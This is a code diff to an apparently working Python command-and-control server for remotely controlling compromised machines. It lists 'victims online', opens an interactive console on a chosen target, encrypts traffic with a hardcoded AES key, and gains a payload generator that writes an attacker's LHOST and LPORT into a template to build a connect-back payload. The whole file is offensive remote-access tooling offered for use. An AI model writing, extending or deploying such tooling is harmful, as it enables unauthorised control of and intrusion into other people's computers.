@@ -2,13 +2,14 @@ import socket
 import threading
 import json
 import sys
+import os
 import signal
 from Crypto.Cipher import AES
 
 
 conn_list={}
-counter = b"H"*16
-key = b"H"*32
+counter = b"H"*16 # 16 chars
+key = b"H"*32  # 32 chars
 
 
 
@@ -65,7 +66,7 @@ def trigger():
                 #print(conn_list)
                 console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
         else:
-            print(bcolors.FAIL,"\nNo connections")
+            print(bcolors.FAIL,"\n[*] No connections")
 
 def console(conn,bot,socket_target):
     print("\n====Target::({})====".format(bot))
@@ -89,13 +90,34 @@ def console(conn,bot,socket_target):
 
 
 def generatePayload():
-    print("[*] Let's generate payloadz")
-    #option=input("LHOST> ")
+    print("[*] Let's generate payloads")
+
+    # Python payload already exists?
+    if os.path.exists("generated/payload.py"):
+        os.remove("generated/payload.py")
+    else:
+        pass
+
+    lhost=input("LHOST> ") or "127.0.0.1"
+    lport=input("LPORT> ") or "443"
     # Read payload file, and replace host variable 
-    f = open("payload.py", "r")
+    f = open("utils/listener.py", "r")
+    x = open("generated/payload.py", "w+")
     for line in f:
-        print(line)
+        if ( "HOST = 127.0.0.1" in line ):
+            x.write("    HOST = '" + lhost + "'\n")
+        if ( "443" in line):
+            x.write("    PORT = " + lport + "\n")
+        else:
+            if ( "HOST = 127.0.0.1" in line ):
+                pass
+            else:
+                x.write(line)
     f.close()
+
+def bye():
+    print(bcolors.HEADER," \n[!] ooof bye :(")
+
 
 def banner():
     print("")
@@ -124,8 +146,12 @@ def main():
             p.start()
             p.join()
         elif choice =='help' or choice =='?':
-            print(bcolors.HEADER,"\n==========\n[+] hosts or h (To check for available victims online)\n[+] interact or i (To interact with a target)\n==========")
-        elif choice =='payload':
+            #print(bcolors.HEADER,"\nCommands==========\n[+] hosts or h \t\tCheck for available victims online\n[+] interact or i (To interact with a target)\n==========")
+            print(bcolors.HEADER,"\nCommands\n==========\n[+] hosts or h \t\t\t\tCheck for available victims online")
+            print("[+] interact or i \t\t\tinteract with a target")
+            print("[+] payload or p \t\t\tgenerate payloads")
+            print("==========")
+        elif choice =='payload' or choice =='p':
             generatePayload()
         else:
             pass
@@ -144,8 +170,7 @@ class bcolors:
 try:
     main()
 except:
-    print(bcolors.HEADER," \n[!] ooof bye :(")
-    
+    bye()
 
 
 
